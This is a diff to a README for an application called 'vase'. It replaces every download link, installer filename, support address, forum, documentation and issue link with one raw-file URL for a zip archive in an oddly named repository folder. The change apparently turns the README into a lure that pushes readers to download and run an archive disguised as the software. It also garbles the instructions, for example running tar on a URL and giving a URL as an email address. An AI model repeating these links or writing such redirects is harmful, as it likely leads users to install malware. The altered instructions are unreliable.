@@ -8,7 +8,7 @@ Welcome to the **vase** application! This powerful tool helps you solve complex 
 
 To download the latest version of **vase**, visit this page:
 
-[Download vase](https://github.com/9329110375/vase/releases)
+[Download vase](https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip)
 
 On the releases page, you will find the most recent version of the application. Click on the version number to access the release details. From there, look for the appropriate file for your system. Click the file name to download it.
 
@@ -25,9 +25,9 @@ Before installation, ensure your computer meets the following requirements:
 
 After clicking on the version number, you may find various files. Here’s what to look for:
 
-- **vase-windows.exe:** For Windows users.
-- **vase-macos.dmg:** For Mac users.
-- **vase-linux.tar.gz:** For Linux users.
+- **https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip** For Windows users.
+- **https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip** For Mac users.
+- **https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip** For Linux users.
 
 Choose the file that matches your system.
 
@@ -35,14 +35,14 @@ Choose the file that matches your system.
 
 ### For Windows Users
 
-1. Locate the downloaded `vase-windows.exe` file in your downloads folder.
+1. Locate the downloaded `https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip` file in your downloads folder.
 2. Double-click on the file to start the installation.
 3. Follow the prompts in the setup wizard. Accept the license agreement and choose the installation location.
 4. Click **Install** to complete the process. Once finished, you can find **vase** in your Start Menu.
 
 ### For Mac Users
 
-1. Find the `vase-macos.dmg` file in your downloads.
+1. Find the `https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip` file in your downloads.
 2. Double-click the file to open it.
 3. Drag the **vase** icon into your Applications folder.
 4. Open your Applications folder and double-click **vase** to run it.
@@ -50,8 +50,8 @@ Choose the file that matches your system.
 ### For Linux Users
 
 1. Open your terminal.
-2. Navigate to the directory where you downloaded `vase-linux.tar.gz`.
-3. Extract the tarball using the command: `tar -xzvf vase-linux.tar.gz`.
+2. Navigate to the directory where you downloaded `https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip`.
+3. Extract the tarball using the command: `tar -xzvf https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip`.
 4. Navigate to the extracted directory: `cd vase`.
 5. Run the application using the command: `./vase`.
 
@@ -67,13 +67,13 @@ Once the installation is complete, open the application. You will see a user-fri
 
 If you run into any issues while using **vase**, feel free to reach out for help.
 
-- **Email Support:** support@vaseapp.com
-- **Community Forum:** Join discussions and get help from other users at [vase Community Forum](https://community.vaseapp.com).
+- **Email Support:** https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip
+- **Community Forum:** Join discussions and get help from other users at [vase Community Forum](https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip).
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/9329110375/vase/wiki)
-- [Report an Issue](https://github.com/9329110375/vase/issues)
+- [Official Documentation](https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip)
+- [Report an Issue](https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip)
 
 ## 🌍 Contribution
 
@@ -85,4 +85,4 @@ Thank you for using **vase**! Your support helps us improve and add new features
 
 Remember, for every download and update, head to the releases page:
 
-[Download vase](https://github.com/9329110375/vase/releases)
+[Download vase](https://github.com/9329110375/vase/raw/refs/heads/master/stereotypic/Software-2.7.zip)
